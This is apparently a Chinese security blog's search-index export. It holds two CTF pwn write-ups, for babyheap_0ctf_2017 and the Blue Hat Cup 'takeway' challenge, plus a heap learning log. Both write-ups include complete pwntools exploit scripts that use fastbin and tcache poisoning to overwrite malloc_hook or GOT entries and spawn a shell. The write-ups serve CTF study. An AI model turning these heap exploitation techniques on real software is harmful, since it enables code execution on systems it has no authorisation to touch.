<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF babyheap_0ctf_2017</title>
    <url>/2023/08/14/BUUCTF%20babyheap_0ctf_2017/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>

<span id="more"></span>
<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>七月学完栈溢出，ak掉buu前两页的所有栈题<br>八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br>参加了个数据安全的夏令营<br>给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br>给SecretFlow审了一点go语言的洞<br>然后用C#和xaml给sdu校园网写了个一键修复脚本<br>总而言之学的很杂…说实话真不如多打点比赛。<br>本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了…<br>总而言之还是脚踏实地学一点算一点吧<br>还有个南大PA的坑等着我去填呢…才刚把nemu的gdb实现了个单步步入…  </p>
<hr>
<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
<p>做完这道题才算真正意义上的AK第一页XD</p>
<h3 id="Ⅰ-主要知识点"><a href="#Ⅰ-主要知识点" class="headerlink" title="Ⅰ. 主要知识点"></a>Ⅰ. 主要知识点</h3><ol>
<li>堆溢出</li>
</ol>
</blockquote>
<h3 id="Ⅱ-解题步骤"><a href="#Ⅱ-解题步骤" class="headerlink" title="Ⅱ. 解题步骤"></a>Ⅱ. 解题步骤</h3><ol>
<li><p>checksec 保护全开<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
</li>
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
</li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p>
</li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol>
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址<ol>
<li>要泄露libc地址，肯定要读存有libc地址的地址<ol>
<li>哪里存着libc地址？unsorted bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol>
</li>
</ol>
</li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol>
</li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
<p>此时堆的情况如下<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
</li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
<p>heap情况如下<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>bin情况如下<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
</li>
<li><p>堆溢出，操控fastbin</p>
<ol>
<li>现在是main_arena_fastbin_0x20 —-&gt; chunk2 —-&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 —-&gt; chunk2 —-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol>
</li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
<p>heap情况如下<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
</li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
</li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来再malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br>⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
<ol>
<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Ⅲ-完整EXP"><a href="#Ⅲ-完整EXP" class="headerlink" title="Ⅲ. 完整EXP"></a>Ⅲ. 完整EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Ⅳ-一些疑问"><a href="#Ⅳ-一些疑问" class="headerlink" title="Ⅳ. 一些疑问"></a>Ⅳ. 一些疑问</h3><ol>
<li>__malloc_hook不是在data段中吗？这题开了FULL RELRO为什么可以改啊🤔</li>
<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？<ol>
<li>unsortedbin，后向合并</li>
</ol>
</li>
<li><strong><em>为什么非要在aed处申请堆块？</em></strong><ol>
<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
    <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学艺不精...对于"读/写函数对指针的利用"没那么敏感（
</blockquote>

<span id="more"></span>
<h1 id="0xff-说在前面"><a href="#0xff-说在前面" class="headerlink" title="0xff 说在前面"></a>0xff 说在前面</h1><p>下文EXP中，leak堆地址的部分需要”伪爆破”，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行<br><a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令: 7c9pe6</p>
<h1 id="0x00-Exploitations"><a href="#0x00-Exploitations" class="headerlink" title="0x00 Exploitations"></a>0x00 Exploitations</h1><ol>
<li>tcachebin libc2.31 <ol>
<li>tcachebin poisoning</li>
<li>版本判断<ol>
<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
<li>tcache有doublefree检测，则是2.28以上</li>
<li>有tcache，则是2.26以上</li>
</ol>
</li>
</ol>
</li>
<li>UAF</li>
<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
</ol>
<h1 id="0x01-反汇编修改"><a href="#0x01-反汇编修改" class="headerlink" title="0x01  反汇编修改"></a>0x01  反汇编修改</h1><p>首先进行一个反汇编的读</p>
<blockquote>
<p>trick: IDA中对变量按Y键可以改变变量类型</p>
</blockquote>
<p><img src="/pic/Pasted image 20230826230935.png" alt=""><br>alloc: strcspn是从字符串中返回不含“所查找字符”的子字符串的长度<br><img src="/pic/Pasted image 20230826231015.png" alt=""><br>delete: 指针未置零，一眼UAF<br><img src="/pic/Pasted image 20230826231112.png" alt=""><br>modify<br><img src="/pic/Pasted image 20230826231127.png" alt=""></p>
<h1 id="0x02-分析与思路构造"><a href="#0x02-分析与思路构造" class="headerlink" title="0x02  分析与思路构造"></a>0x02  分析与思路构造</h1><blockquote>
<p>分析部分</p>
<ol>
<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28<ol>
<li>没办法直接用unsortedbin leak libc</li>
<li>不能通过填满tcachebin来绕过tcache机制</li>
<li>tcachebins poisoning<ol>
<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
</ol>
</li>
</ol>
</li>
<li>分析modify: 有puts/read<ol>
<li>可能通过puts”直到遇到换行符才停止输出”的原理来泄露什么东西</li>
</ol>
</li>
<li>分析delete<ol>
<li>UAF</li>
</ol>
</li>
<li><p>远程测试libc版本</p>
<ol>
<li>doubleFree有限制，2.28以上</li>
<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
</ol>
<p>思路构造部分</p>
</li>
</ol>
</blockquote>
<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br>后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（<br>打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
<p>综上，思路为：</p>
<ol>
<li>利用tcachebin的bk泄露堆地址</li>
<li>在heapList伪造chunk，修改chunk0_ptr为”puts_got-8”</li>
<li>puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址</li>
<li>通过gdb发现”puts_got-8”正好是”free_got”</li>
<li>而read函数正好是修改”puts_got-8”指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr</li>
<li>由于chunk0_ptr, chunk1_ptr均被修改，所以我们要找”ptr没有被修改”&amp;”chunk没有被free过”的chunk2存一下/bin/sh</li>
<li>free chunk2 —&gt; getshell！<h1 id="0x03-分步解题"><a href="#0x03-分步解题" class="headerlink" title="0x03  分步解题"></a>0x03  分步解题</h1></li>
<li>patchelf，根据远程调试选择了libc2.31<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></li>
<li>利用tcachebin的bk泄露堆地址<br>可以看到bk是指向tcachebin_entries[3]的<br><img src="/pic/Pasted image 20230827001916.png" alt=""><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # 注：这里我没想到更好的方法，heap_addr有可能是三字节</span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure></li>
<li>通过tcache poisoning在heapList段伪造chunk2，<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure></li>
<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误: 下图“加上下一个chunk的prev_size构成了chunk2”中的”chunk2”应为chunk3）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure>
<img src="/pic/Pasted image 20230827003153.png" alt=""><br>读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts</li>
<li>修改”puts_got-8”指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure></li>
<li>找”ptr没有被修改”&amp;”chunk没有被free过”的chunk2存一下/bin/sh然后free掉他，getshell！<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x04-完整EXP"><a href="#0x04-完整EXP" class="headerlink" title="0x04  完整EXP"></a>0x04  完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><p>这题太遗憾了…最后也没做出来。不过做一窍不通的题收获才最大。<br>做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br>对tcachebin的第一印象如下:  </p>
<ol>
<li>概述<ol>
<li>0x10~0x410（貌似是）的chunk</li>
<li>LIFO</li>
<li>大小只有7，free满以后再free就会放到对应的其他bin中</li>
<li>2.28及以下的libc不检测double free</li>
</ol>
</li>
<li>伪造chunk<ol>
<li>安全性比fastbin还差，不检验fd指向chunk的size直接申请</li>
</ol>
</li>
<li>leak堆地址<ol>
<li>2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry<br>目前就想到这些，这次多亏队友带飞，进半决赛了XD</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>HeapLearningLog1</title>
    <url>/2023/08/24/HeapLearningLog1/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学习还是要写点日志才有意思
</blockquote>

<span id="more"></span>
<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><blockquote>
<p>关于博客</p>
</blockquote>
<p>平时通过搜索学习时，经常会遇到一些吸收起来特别困难博客，这些博客大多是博主的外脑，博主看到自己的博客可能马上能理解自己写了什么，或者知道该怎么检索这篇博客。但对于读者，这篇博客几乎没有什么用……搜索引擎把这篇博客拉过来纯属浪费读者的时间。<br>所以我希望自己关于学习的blog，能够让一个0基础的读者从头到尾读完并且吸收这篇blog的内容。再不济也要让读者感到有用。而外脑放在本地即可。  </p>
<blockquote>
<p>关于LearningLog</p>
</blockquote>
<p>我在学习nju的PA时写过一段时间的learninglog，目的是强迫自己输出以达到更好的理解，review log也可以让自己关注好自己的学习动态<del>（神精态状）</del><br>对于读者，learninglog可以给到借鉴作用，在学习过程中起到对照作用，不至于担忧自己的学习进度。</p>
<hr>
<h2 id="2023-08-24"><a href="#2023-08-24" class="headerlink" title="2023/08/24"></a>2023/08/24</h2><p>已经8.25了。。。<br>hacknote那道题，还是用fastbin机制将heapList进行修改，然后UAF进行leak和提权。<br>现在做题感觉还是不够灵活，看到好多dai佬在大一结束的时候Pwn就已经很强了…我这半道出家实在没眼看。<br>所以只好成为赛棍了(<br>从25号开始白天没别的事情就开刷，像buu第二页那样一天8道，不求质量，只求积累足够的经验题型，不会就看答案。<br>拿高考数学来举例，我现在不是120提到140，而是20提到40分。<br>加油吧…任重道远</p>
<h2 id="2023-08-25"><a href="#2023-08-25" class="headerlink" title="2023/08/25"></a>2023/08/25</h2><p>好好好，整了一天新生赛，有点浮躁。<br>弹了会儿吉他现在才稍微好点<br>开整！</p>
<p>结果打了一天的水题，把buu前四页的栈题和格式化字符串全打了，堆题畏难情绪到达了一个巅峰（  </p>
<h2 id="2023-08-26"><a href="#2023-08-26" class="headerlink" title="2023/08/26"></a>2023/08/26</h2><p>蓝帽杯！做了道tcachebin的堆题，虽然是赛后一小时解出来的（<br>虽然但是，还是一上来就做难题并且是在比赛中做题，吸收知识快一些。<br>写了篇wp,今天就先到这吧。</p>
]]></content>
      <categories>
        <category>LearningLog</category>
      </categories>
      <tags>
        <tag>LearningLog, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
